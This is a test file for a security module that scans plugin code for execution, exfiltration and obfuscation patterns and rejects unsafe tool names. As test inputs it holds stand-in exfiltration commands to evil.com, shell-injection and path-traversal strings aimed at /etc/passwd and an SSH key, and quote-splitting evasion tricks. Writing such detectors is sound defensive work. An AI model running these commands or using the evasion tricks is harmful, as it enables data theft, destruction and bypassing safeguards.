/**
 * Tests for the security module: skill safety checks, tool name sanitization,
 * and safety result formatting.
 *
 * Validates that:
 *   - checkSkillSafety detects code execution, data exfiltration, and obfuscation patterns
 *   - sanitizeToolName prevents directory traversal, absolute path, null byte, and path-based attacks
 *   - formatSkillSafetyBlock produces correct human-readable output
 */

import { describe, it, expect } from "vitest";
import { sanitizeToolName, checkSkillSafety, formatSkillSafetyBlock } from "../../src/lib/tools/security.js";

// ── sanitizeToolName ────────────────────────────────────────────────────

describe("sanitizeToolName()", () => {
  describe("valid tool names", () => {
    it("accepts simple alphanumeric names", () => {
      const result = sanitizeToolName("myTool");
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe("myTool");
      expect(result.reason).toBeNull();
    });

    it("accepts names with hyphens and underscores", () => {
      expect(sanitizeToolName("my-tool").valid).toBe(true);
      expect(sanitizeToolName("my_tool").valid).toBe(true);
      expect(sanitizeToolName("my-tool_v2").valid).toBe(true);
    });

    it("accepts names with single dots (e.g., namespaced tools)", () => {
      const result = sanitizeToolName("security.check");
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe("security.check");
    });

    it("accepts purely numeric names", () => {
      expect(sanitizeToolName("123").valid).toBe(true);
    });

    it("trims whitespace from valid names", () => {
      const result = sanitizeToolName("  myTool  ");
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe("myTool");
    });
  });

  describe("directory traversal prevention", () => {
    it("rejects ../../etc/passwd", () => {
      const result = sanitizeToolName("../../etc/passwd");
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeNull();
      expect(result.reason).toContain("..");
    });

    it("rejects ../secret", () => {
      const result = sanitizeToolName("../secret");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("..");
    });

    it("rejects deeply nested traversal like ../../../../root/.ssh/id_rsa", () => {
      const result = sanitizeToolName("../../../../root/.ssh/id_rsa");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("..");
    });

    it("rejects .. by itself", () => {
      const result = sanitizeToolName("..");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("..");
    });

    it("rejects name with embedded .. like foo..bar", () => {
      const result = sanitizeToolName("foo..bar");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("..");
    });

    it("rejects Windows-style traversal ..\\windows\\system32", () => {
      const result = sanitizeToolName("..\\windows\\system32");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("..");
    });
  });

  describe("absolute path prevention", () => {
    it("rejects Unix absolute path /etc/passwd", () => {
      const result = sanitizeToolName("/etc/passwd");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("absolute path");
    });

    it("rejects Windows absolute path C:\\Windows\\System32", () => {
      const result = sanitizeToolName("C:\\Windows\\System32");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("absolute path");
    });

    it("rejects root path /", () => {
      const result = sanitizeToolName("/");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("absolute path");
    });
  });

  describe("path separator prevention", () => {
    it("rejects forward slash in name like sub/tool", () => {
      const result = sanitizeToolName("sub/tool");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("path separator");
    });

    it("rejects backslash in name like sub\\tool", () => {
      const result = sanitizeToolName("sub\\tool");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("path separator");
    });
  });

  describe("null byte prevention", () => {
    it("rejects name with null byte", () => {
      const result = sanitizeToolName("tool\0.txt");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("null byte");
    });

    it("rejects name that is just a null byte", () => {
      const result = sanitizeToolName("\0");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("null byte");
    });
  });

  describe("empty and whitespace names", () => {
    it("rejects empty string", () => {
      const result = sanitizeToolName("");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("empty");
    });

    it("rejects whitespace-only string", () => {
      const result = sanitizeToolName("   ");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("empty");
    });
  });

  describe("special character prevention", () => {
    it("rejects names with shell metacharacters", () => {
      expect(sanitizeToolName("tool;rm -rf /").valid).toBe(false);
      expect(sanitizeToolName("tool$(whoami)").valid).toBe(false);
      expect(sanitizeToolName("tool`id`").valid).toBe(false);
      expect(sanitizeToolName("tool|cat /etc/passwd").valid).toBe(false);
    });

    it("rejects names with spaces", () => {
      expect(sanitizeToolName("my tool").valid).toBe(false);
    });

    it("rejects names with quotes", () => {
      expect(sanitizeToolName("tool'name").valid).toBe(false);
      expect(sanitizeToolName('tool"name').valid).toBe(false);
    });
  });
});

// ── checkSkillSafety ────────────────────────────────────────────────────

describe("checkSkillSafety()", () => {
  describe("safe content", () => {
    it("returns safe for harmless code", () => {
      const result = checkSkillSafety("const x = 1 + 2;\nconsole.log(x);");
      expect(result.safe).toBe(true);
      expect(result.threats).toEqual([]);
      expect(result.severity).toBeNull();
    });

    it("returns safe for empty string", () => {
      const result = checkSkillSafety("");
      expect(result.safe).toBe(true);
      expect(result.threats).toEqual([]);
    });
  });

  describe("admin override", () => {
    it("bypasses all checks when adminOverride is true", () => {
      const dangerousCode = "eval('rm -rf /');\nexec('whoami');";
      const result = checkSkillSafety(dangerousCode, { adminOverride: true });
      expect(result.safe).toBe(true);
      expect(result.threats).toEqual([]);
      expect(result.severity).toBeNull();
    });
  });

  describe("code execution detection (critical)", () => {
    it("detects eval()", () => {
      const result = checkSkillSafety("const x = eval('1+1');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("eval()")])
      );
    });

    it("detects exec()", () => {
      const result = checkSkillSafety("exec('ls -la');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("exec()")])
      );
    });

    it("detects execSync()", () => {
      const result = checkSkillSafety("execSync('cat /etc/passwd');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects spawn()", () => {
      const result = checkSkillSafety("spawn('node', ['script.js']);");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects spawnSync()", () => {
      const result = checkSkillSafety("spawnSync('ls');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects fork()", () => {
      const result = checkSkillSafety("fork('./worker.js');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects new Function()", () => {
      const result = checkSkillSafety("const fn = new Function('return 42');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("new Function()")])
      );
    });

    it("detects child_process module reference", () => {
      const result = checkSkillSafety("import { exec } from 'child_process';");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects require('child_process')", () => {
      const result = checkSkillSafety("const cp = require('child_process');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });
  });

  describe("data exfiltration detection (high)", () => {
    it("detects curl commands", () => {
      const result = checkSkillSafety("curl https://evil.com/steal?data=secret");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("curl")])
      );
    });

    it("detects wget commands", () => {
      const result = checkSkillSafety("wget https://evil.com/payload");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("detects fetch() calls", () => {
      const result = checkSkillSafety("await fetch('https://evil.com');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("detects XMLHttpRequest", () => {
      const result = checkSkillSafety("const xhr = new XMLHttpRequest();");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("detects http.request()", () => {
      const result = checkSkillSafety("http.request('https://evil.com');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("detects https.request()", () => {
      const result = checkSkillSafety("https.request('https://evil.com');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });
  });

  describe("allowed domains bypass for data exfiltration", () => {
    it("allows fetch to an allowed domain", () => {
      const code = "await fetch('https://api.example.com/data');";
      const result = checkSkillSafety(code, { allowedDomains: ["api.example.com"] });
      expect(result.safe).toBe(true);
      expect(result.threats).toEqual([]);
    });

    it("allows fetch to a subdomain of an allowed domain", () => {
      const code = "await fetch('https://sub.example.com/data');";
      const result = checkSkillSafety(code, { allowedDomains: ["example.com"] });
      expect(result.safe).toBe(true);
    });

    it("blocks fetch to a non-allowed domain", () => {
      const code = "await fetch('https://evil.com/steal');";
      const result = checkSkillSafety(code, { allowedDomains: ["api.example.com"] });
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("domain matching is case-insensitive", () => {
      const code = "await fetch('https://API.EXAMPLE.COM/data');";
      const result = checkSkillSafety(code, { allowedDomains: ["api.example.com"] });
      expect(result.safe).toBe(true);
    });
  });

  describe("obfuscation detection (medium)", () => {
    it("detects atob()", () => {
      const result = checkSkillSafety("const decoded = atob('aGVsbG8=');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("medium");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("atob()")])
      );
    });

    it("detects Buffer.from with base64 encoding", () => {
      const result = checkSkillSafety("Buffer.from('aGVsbG8=', 'base64');");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("medium");
    });

    it("detects String.fromCharCode()", () => {
      const result = checkSkillSafety("String.fromCharCode(72, 101, 108);");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("medium");
    });
  });

  describe("high-entropy string detection", () => {
    it("detects long high-entropy strings (obfuscated payloads)", () => {
      // Generate a string with high entropy (random-looking)
      const highEntropy = "aZ3kQ9xW2pL7mR4nB8vY1cT6sF0jD5hG";
      const padded = highEntropy + highEntropy; // make it > 40 chars
      const code = `const payload = "${padded}";`;
      const result = checkSkillSafety(code);
      expect(result.safe).toBe(false);
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("High-entropy string")])
      );
    });

    it("does not flag short strings even if high-entropy", () => {
      // String under 40 chars won't be checked
      const code = 'const x = "aZ3kQ9xW2pL7";';
      const result = checkSkillSafety(code);
      // Should be safe (string too short for entropy check)
      expect(result.safe).toBe(true);
    });

    it("does not flag low-entropy long strings", () => {
      const lowEntropy = "a".repeat(50);
      const code = `const x = "${lowEntropy}";`;
      const result = checkSkillSafety(code);
      expect(result.safe).toBe(true);
    });
  });

  describe("severity ranking", () => {
    it("returns critical when both critical and high threats exist", () => {
      const code = "eval('test'); curl https://evil.com/data";
      const result = checkSkillSafety(code);
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats.length).toBeGreaterThanOrEqual(2);
    });

    it("returns high when high and medium threats exist but no critical", () => {
      const code = "await fetch('https://evil.com'); atob('encoded');";
      const result = checkSkillSafety(code);
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });
  });

  describe("skill name labeling", () => {
    it("prefixes threats with skill name when provided", () => {
      const result = checkSkillSafety("eval('bad');", { skillName: "malicious-skill" });
      expect(result.safe).toBe(false);
      expect(result.threats[0]).toContain("[malicious-skill]");
    });

    it("does not prefix when skillName is omitted", () => {
      const result = checkSkillSafety("eval('bad');");
      expect(result.safe).toBe(false);
      expect(result.threats[0]).not.toContain("[");
    });
  });

  describe("multiple threats in one content", () => {
    it("reports all detected threats", () => {
      const code = [
        "eval('payload');",
        "exec('whoami');",
        "spawn('node');",
        "curl https://evil.com/steal",
        "atob('data');",
      ].join("\n");
      const result = checkSkillSafety(code);
      expect(result.safe).toBe(false);
      expect(result.threats.length).toBeGreaterThanOrEqual(5);
      expect(result.severity).toBe("critical");
    });
  });

  describe("quote-splitting attack resistance", () => {
    it("detects eval even with unusual spacing", () => {
      // eval  ( — the regex uses \beval\s*\( so whitespace between eval and ( is ok
      const result = checkSkillSafety("eval  ('payload');");
      expect(result.safe).toBe(false);
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("eval()")])
      );
    });

    it("does not false-positive on words containing 'eval' as substring", () => {
      // "medieval" contains "eval" but \b boundary should prevent match
      const result = checkSkillSafety("const medieval = 'history';");
      expect(result.safe).toBe(true);
    });

    it("does not false-positive on words containing 'exec' as substring", () => {
      // "execute" contains "exec" but the pattern requires \bexec\s*\(
      const result = checkSkillSafety("// We execute the plan by calling run()");
      expect(result.safe).toBe(true);
    });

    it("detects eval with double-quote splitting: ev\"\"al(...)", () => {
      const result = checkSkillSafety('ev""al("payload")');
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("eval()")])
      );
    });

    it("detects eval with single-quote splitting: ev''al(...)", () => {
      const result = checkSkillSafety("ev''al('payload')");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects exec with double-quote splitting: ex\"\"ec(...)", () => {
      const result = checkSkillSafety('ex""ec("whoami")');
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("exec()")])
      );
    });

    it("detects eval with interleaved single quotes: e'v'a'l(...)", () => {
      const result = checkSkillSafety("e'v'a'l('payload')");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });

    it("detects spawn with double-quote splitting: sp\"\"awn(...)", () => {
      const result = checkSkillSafety('sp""awn("node")');
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("spawn()")])
      );
    });

    it("detects new Function with quote splitting: new Fun\"\"ction(...)", () => {
      const result = checkSkillSafety('new Fun""ction("return 42")');
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.threats).toEqual(
        expect.arrayContaining([expect.stringContaining("new Function()")])
      );
    });

    it("detects fetch with backtick splitting: fe`\u200B`tch(...)", () => {
      const result = checkSkillSafety("fe``tch('https://evil.com')");
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("high");
    });

    it("detects child_process with quote splitting: child_pro\"\"cess", () => {
      const result = checkSkillSafety('require("child_pro""cess")');
      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
    });
  });
});

// ── formatSkillSafetyBlock ──────────────────────────────────────────────

describe("formatSkillSafetyBlock()", () => {
  it("returns null for safe results", () => {
    const result = formatSkillSafetyBlock({ safe: true, threats: [], severity: null });
    expect(result).toBeNull();
  });

  it("formats a single-threat block correctly", () => {
    const block = formatSkillSafetyBlock({
      safe: false,
      threats: ["eval() — arbitrary code execution"],
      severity: "critical",
    });
    expect(block).not.toBeNull();
    expect(block).toContain("SKILL BLOCKED");
    expect(block).toContain("1 threat(s)");
    expect(block).toContain("critical");
    expect(block).toContain("1. eval()");
    expect(block).toContain("adminOverride");
  });

  it("formats multiple threats with numbering", () => {
    const block = formatSkillSafetyBlock({
      safe: false,
      threats: [
        "eval() — arbitrary code execution",
        "fetch() — potential data exfiltration via HTTP",
      ],
      severity: "critical",
    });
    expect(block).not.toBeNull();
    expect(block).toContain("2 threat(s)");
    expect(block).toContain("1. eval()");
    expect(block).toContain("2. fetch()");
  });
});
